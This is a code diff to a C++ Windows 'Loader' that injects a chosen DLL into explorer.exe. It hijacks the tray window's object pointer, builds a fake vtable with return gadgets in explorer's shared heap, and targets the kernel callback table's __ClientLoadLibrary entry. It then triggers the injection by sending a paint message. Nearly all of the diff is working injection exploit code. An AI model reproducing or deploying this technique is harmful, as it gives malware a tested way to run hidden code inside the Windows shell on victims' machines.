@@ -1,6 +1,6 @@
 #include "Loader.h"
-
 #include "ProcessUtils.h"
+#include "Log.h"
 
 #include <io.h>
 #include <stdexcept>
@@ -112,7 +112,7 @@ BOOL Loader::Inject(const TCHAR* dllPath)
 	// Trigger the injection
 	SendNotifyMessage(hShellTrayWnd, WM_PAINT, 0xABABABAB, 0);
 	// Wait For It
-	Sleep(500);
+	Sleep(1000);
 	// Restore Old Object
 	SetWindowLongPtr(hShellTrayWnd, 0, (LONG_PTR)CTrayObj);
 
@@ -189,36 +189,60 @@ PVOID Loader::BuildAttackBuffer(const TCHAR * dllPath)
 {
 	PVOID pfnLoadLibrary = (PVOID)GetProcAddress(LoadLibrary(_T("kernel32.dll")), "LoadLibraryA");
 	UINT CurrIndex = 0;
-#define _fnINSTRINGNULL_INDEX 0x1B
+#define _fnINSTRINGNULL_INDEX 27
+#define __ClientLoadLibrary_INDEX 74
 
 	// Get the callback table.
 	PTEB Teb = NtCurrentTeb();
 	PBYTE Peb = (PBYTE)Teb->ProcessEnvironmentBlock;
 	PVOID* CallbackTable = *(PVOID**)((PBYTE)Peb + 0x58);
-	PVOID TargetFunction = CallbackTable[_fnINSTRINGNULL_INDEX];
+	PVOID TargetFunction = CallbackTable[__ClientLoadLibrary_INDEX];
+	PrintOut(_T("TargetFunction: 0x%IX\n"), TargetFunction);
+	PrintOut(_T("ExplorerSharedHeap: 0x%IX\n"), (size_t)m_pExplorerSharedHeap + m_WindowBufferOffset);
 
 #define SET_LONG(value) SetWindowLongPtr(m_hWnd, CurrIndex  * sizeof(LONG_PTR), (LONG_PTR)value);CurrIndex++;
+	SET_LONG((size_t)m_pExplorerSharedHeap + m_WindowBufferOffset + 16); // 0x00
+	// Must be zero
+	SET_LONG(0); // 0x08
+	// Make first virtual function point to target function
+	SET_LONG(TargetFunction); // 0x10
+	// This should point to ret
+	SET_LONG(GADGET_ADDRESS(s_Gadgets[0])); // 0x18
+	// This should point to ret
+	SET_LONG(GADGET_ADDRESS(s_Gadgets[0])); // 0x20
+	SET_LONG(0); // 0x28
+	// This should point to the library to load
+	SET_LONG((size_t)m_pExplorerSharedHeap + m_WindowBufferOffset + (CurrIndex + 3) * sizeof(LONG_PTR)); // 0x30
+	// Must be zero	
+	SET_LONG(0); // 0x38
+	SET_LONG(0); // 0x40
+	SetLibraryPathW(dllPath, CurrIndex);
 
-	SET_LONG((size_t)m_pExplorerSharedHeap + m_WindowBufferOffset + 16);
-	SET_LONG(0); // Must be zero 
-	SET_LONG(TargetFunction); // Make it point to target function
-	SET_LONG(GADGET_ADDRESS(s_Gadgets[0])); // This should point to ret
-	SET_LONG(GADGET_ADDRESS(s_Gadgets[0])); // This should point to ret
-	SET_LONG((size_t)m_pExplorerSharedHeap + m_WindowBufferOffset + (CurrIndex + 5) * sizeof(LONG_PTR)); // This should point to the library to load    
-	SET_LONG(5);
-	SET_LONG(6);
-	SET_LONG(7);
-	SET_LONG(pfnLoadLibrary); // This is the LoadLibraryFunction
-
-	SetLibraryPath(dllPath, CurrIndex);
-
-	//SET_LONG(0x6C6C642E785C3A63); // This is c:\\x.dll
+	//SET_LONG((size_t)m_pExplorerSharedHeap + m_WindowBufferOffset + sizeof(LONG_PTR) * 2); // 0x00
+	//// Must be zero
+	//SET_LONG(0); // 0x08
+	//// Make first virtual function point to target function
+	//SET_LONG(TargetFunction); // 0x10
+	//// This should point to ret
+	//SET_LONG(GADGET_ADDRESS(s_Gadgets[0])); // 0x18
+	//// This should point to ret
+	//SET_LONG(GADGET_ADDRESS(s_Gadgets[0])); // 0x20
+	//// This should point to the library to load
+	//SET_LONG((size_t)m_pExplorerSharedHeap + m_WindowBufferOffset + (CurrIndex + 5) * sizeof(LONG_PTR)); // 0x28
+	//
+	//SET_LONG(5); // 0x30
+	//
+	//SET_LONG(6);
+	//SET_LONG(7);
+	//SET_LONG(pfnLoadLibrary); // This is the LoadLibraryFunction
+	//
+	//SetLibraryPath(dllPath, CurrIndex);
 #undef SET_LONG
 
 	return (PVOID)((size_t)m_pExplorerSharedHeap + m_WindowBufferOffset);
 }
 
-void Loader::SetLibraryPath(const TCHAR * path, UINT & currentIndex)
+void Loader::SetLibraryPath(const TCHAR* path, UINT & currentIndex)
 {
 	char szDllPath[MAX_PATH] = { 0 };
 
@@ -241,6 +265,37 @@ void Loader::SetLibraryPath(const TCHAR * path, UINT & currentIndex)
 	for (ULONG i = 0; i <= dllLocationDiv; ++i)
 	{
 		char* ptr = finalDllLocation + (sizeof(LONG_PTR) * i);
+		SetWindowLongPtr(m_hWnd, currentIndex * sizeof(LONG_PTR), *(LONG_PTR*)ptr); currentIndex++;
+	}
+
+	delete[] finalDllLocation;
+
+	SetWindowLongPtr(m_hWnd, currentIndex * sizeof(LONG_PTR), (LONG_PTR)0); currentIndex++;
+}
+
+void Loader::SetLibraryPathW(const TCHAR* path, UINT & currentIndex)
+{
+	wchar_t szDllPath[MAX_PATH] = { 0 };
+	
+#ifdef UNICODE
+	wcscpy_s(szDllPath, path);
+#else
+	size_t converted = 0;
+	mbstowcs_s(&converted, szDllPath, path, sizeof(szDllPath));
+#endif
+
+	// Now we write the library to load
+	ULONG dllLocationLength = (ULONG)(wcslen(szDllPath) * sizeof(wchar_t));
+	ULONG dllLocationDiv = dllLocationLength / sizeof(LONG_PTR);
+	ULONG dllLocationRemainder = dllLocationLength % sizeof(LONG_PTR);
+
+	const int finalDllLocationSize = (dllLocationDiv * sizeof(LONG_PTR)) + dllLocationRemainder + 1;
+	wchar_t* finalDllLocation = new wchar_t[finalDllLocationSize];
+	wcscpy_s(finalDllLocation, finalDllLocationSize, szDllPath);
+
+	for (ULONG i = 0; i <= dllLocationDiv; ++i)
+	{
+		wchar_t* ptr = finalDllLocation + ((sizeof(LONG_PTR) / sizeof(wchar_t)) * i);
 		SetWindowLongPtr(m_hWnd, currentIndex * sizeof(LONG_PTR), *(LONG_PTR*)ptr); currentIndex++;
 	}
 
